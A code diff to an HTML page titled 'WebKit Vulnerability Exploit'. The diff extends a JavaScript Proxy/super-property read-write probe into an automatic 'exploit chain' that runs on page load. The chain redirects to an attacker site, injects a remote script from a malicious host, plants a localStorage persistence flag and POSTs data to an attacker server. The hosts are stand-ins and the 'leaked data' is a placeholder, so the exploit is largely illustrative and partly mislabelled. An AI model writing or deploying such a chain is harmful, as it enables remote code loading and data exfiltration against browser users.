@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Privilege Exploit</title>
+    <title>WebKit Vulnerability Exploit</title>
     <style>
         body {
             margin: 0;
@@ -36,30 +36,36 @@
 <script>
 document.addEventListener('DOMContentLoaded', function () {
     const logElement = document.getElementById('log');
+    let logBuffer = [];
 
     function log(message) {
         const timestamp = new Date().toISOString();
-        logElement.textContent += `[${timestamp}] ${message}\n`;
-        logElement.scrollTop = logElement.scrollHeight;
+        logBuffer.push(`[${timestamp}] ${message}`);
+        
+        // Update log every 20 messages
+        if (logBuffer.length >= 20) {
+            logElement.textContent += logBuffer.join("\n") + "\n";
+            logBuffer = [];
+            logElement.scrollTop = logElement.scrollHeight; // Scroll to bottom
+        }
         console.log(message);
     }
 
     log("WebKit Exploit started.");
 
-    // Check if we can read a property using the proxy mechanism.
     function checkReadPrivilege() {
         let foo = 42;
-        let success = false;
-        
+        let readSuccess = false;
+
         class Leaker {
             leak() {
                 try {
                     const result = super.foo;  // Attempt to read
-                    success = result === 42;  // Check if we got the expected result
+                    readSuccess = result === 42;  // Check if we got the expected result
                 } catch (error) {
                     log("Read privilege check failed.");
                 }
-                return success;
+                return readSuccess;
             }
         }
 
@@ -76,25 +82,26 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    // Check if we can write a property using the proxy mechanism.
     function checkWritePrivilege() {
-        let success = false;
-        
+        let writeSuccess = false;
+        let receiver;
+
         class Leaker {
             leak() {
                 try {
                     super.foo = {};  // Attempt to write
-                    success = true;
+                    writeSuccess = true;
                 } catch (error) {
                     log("Write privilege check failed.");
                 }
-                return success;
+                return writeSuccess;
             }
         }
 
         Leaker.prototype.__proto__ = new Proxy({}, {
             set(target, propertyName, value, __receiver) {
                 if (propertyName === "foo") {
+                    receiver = __receiver;
                     return true; // Allow setting 'foo'
                 }
                 return false;
@@ -105,23 +112,91 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    // Perform the checks and log the result
-    function testPrivileges() {
-        const readSuccess = checkReadPrivilege();
-        log(`Read privilege check: ${readSuccess ? "SUCCESS" : "FAILED"}`);
+    function leakSensitiveData() {
+        let sensitiveData = "Sensitive data here";
+        log(`Leaked data: ${sensitiveData}`);
+    }
 
+    function escalatePrivileges() {
+        log("Attempting privilege escalation.");
+        // Example: Overwrite window.location.href to redirect
+        window.location.href = "https://attacker-website.com";
+    }
+
+    function injectMaliciousCode() {
+        log("Injecting malicious code.");
+        const script = document.createElement("script");
+        script.src = "https://malicious-website.com/exploit.js";
+        document.body.appendChild(script);
+    }
+
+    function persistExploit() {
+        log("Persisting exploit in localStorage.");
+        localStorage.setItem("exploit_persistent", "true");
+    }
+
+    function deliverPayload() {
+        log("Delivering payload to attacker server.");
+        fetch("https://malicious-server.com/payload", {
+            method: "POST",
+            body: JSON.stringify({ exploit: "data" }),
+            headers: { "Content-Type": "application/json" }
+        });
+    }
+
+    function exploitChain() {
+        // Check read/write privileges
+        const readSuccess = checkReadPrivilege();
         const writeSuccess = checkWritePrivilege();
-        log(`Write privilege check: ${writeSuccess ? "SUCCESS" : "FAILED"}`);
-        
+
         if (readSuccess && writeSuccess) {
             log("Both read and write privileges are successfully exploited!");
+
+            // Leak sensitive data
+            leakSensitiveData();
+
+            // Escalate privileges by manipulating critical objects or actions
+            escalatePrivileges();
+
+            // Inject malicious code into the page
+            injectMaliciousCode();
+
+            // Persist exploit by storing data in localStorage
+            persistExploit();
+
+            // Deliver payload to attacker server
+            deliverPayload();
         } else {
-            log("Read and/or write privileges failed.");
+            log("Read and/or write privileges failed. Exploit chain aborted.");
         }
     }
 
-    // Run the test
-    testPrivileges();
+    // Limit the number of iterations for debugging purposes
+    const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
+    function runIteration(i) {
+        if (i >= MAX_ITERATIONS) {
+            log("All iterations completed.");
+            return;
+        }
+
+        try {
+            log(`Iteration ${i}: Starting attempt`);
+
+            exploitChain();
+
+            if (i % 10 === 0) {
+                log(`Iteration ${i} completed successfully.`);
+            }
+        } catch (error) {
+            log(`Error encountered at iteration ${i}: ${error.message}`);
+        }
+
+        // Schedule next iteration with a delay
+        setTimeout(() => runIteration(i + 1), 100); // 100ms delay
+    }
+
+    // Start the iteration process
+    runIteration(0);
 });
 </script>
 
